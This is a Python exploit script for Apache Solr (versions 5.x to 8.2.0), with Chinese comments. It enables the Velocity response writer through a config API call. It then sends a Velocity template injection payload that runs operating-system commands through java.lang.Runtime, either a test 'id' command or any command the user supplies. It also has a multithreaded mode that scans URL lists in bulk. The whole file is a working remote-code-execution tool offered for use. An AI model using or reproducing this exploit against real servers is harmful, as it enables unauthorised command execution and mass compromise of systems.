# -*- coding: utf -*-
import requests
import threading
import sys
import json
from optparse import OptionParser
requests.packages.urllib3.disable_warnings()

results = []

def poc_check(domain):
    # 该漏洞需要core的名字，所以利用者指定完整路径
    if domain[-1]=="/":
        domain[-1]==""
    
    # header
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type": "application/json"
    }
    
    try:
        # 先修改配置params.resource.loader.enabled
        payload = {
            "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
            }
        }
        req = requests.post(domain, headers=header, data=payload)
        if req.status_code == 200 and "This response format is experimental" in req.text:
            print("\033[32m[Success] params.resource.loader.enabled ==> true\033[0m")
        else:
            print("[False] target is not vulnerable")
        req_2 = requests.get(domain+r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
        print(req_2.text)


    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout " + url)
    except requests.exceptions.ConnectionError:
        print("[-] connect error " + url)
    except Exception as e:
        print(str(e))


def rce(domain, command):
    # 该漏洞需要core的名字，所以利用者指定完整路径
    if domain[-1]=="/":
        domain[-1]==""
    
    # header
    header = {
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    }
    
    try:
        req = requests.get(domain+r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{0}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(command))
        print(req.text)

    except requests.exceptions.ConnectTimeout:
        print("[-] connect timeout " + url)
    except requests.exceptions.ConnectionError:
        print("[-] connect error " + url)
    except Exception as e:
        print(str(e))

# 循环调用poc_check函数，并保存存在漏洞的url到结果字典，将结果保存在output.txt，并在函数结束前输出结果字典。
def batch(domain_list, thread_num, output):
    thread_list = []
    f = open(domain_list, "r")
    f_output = open(output, "w")
    for domain in f.readlines():
        t =threading.Thread(target=poc_check, args=(domain.strip(),))
        thread_list.append(t)
    for i in range(0, len(thread_list)):
        thread_list[i].start()
        while True:
            if len(threading.enumerate()) <= thread_num:
                break
    # 判断最后启动的n个线程是否结束，没结束的话，加上join，确保所有子线程结束之后再进入主线程的写文件操作
    for j in range(len(thread_list)-thread_num, len(thread_list)):
        if thread_list[j].isAlive():
            thread_list[j].join()
    f.close()
    print("-"*35)
    for i in range(0, len(results)):
        f_output.write(results[i]+"\n")
    f_output.close()


if __name__ == '__main__':
    usage = '''
    *************************************************************************************
    *                      Apache Solr RCE (vuln version:5.x~8.2.0)                     *
    * python3 poc.py -u http://xxx:8983/solr/new_core                                   *
    * python3 poc.py -L urls.txt -o output.txt                                          *
    * python3 poc.py -u http://xxx:8983/solr/new_core --command whoami                  *
    *************************************************************************************
    '''
    parser = OptionParser(usage)
    parser.add_option('-u', dest='target_url', type='string', help='single url')
    parser.add_option('-L', dest='target_List', type='string', help='url list')
    parser.add_option('-t', dest='thread', type='int', default=5, help='threads count')
    parser.add_option('-c', '--command', dest='command', help='execute command')
    parser.add_option('-o', dest='output', type='string', default='output.txt', help='output file')
    (options, args) = parser.parse_args()
    # 将接受的参数值赋给变量
    url = options.target_url
    uList = options.target_List
    thread = options.thread
    command = options.command
    outfile = options.output

    if url and command==None:
        poc_check(url)
    elif url and command:
        rce(url, command)
    elif uList and outfile:
        batch(uList, thread, outfile)
    else:
        print(usage)

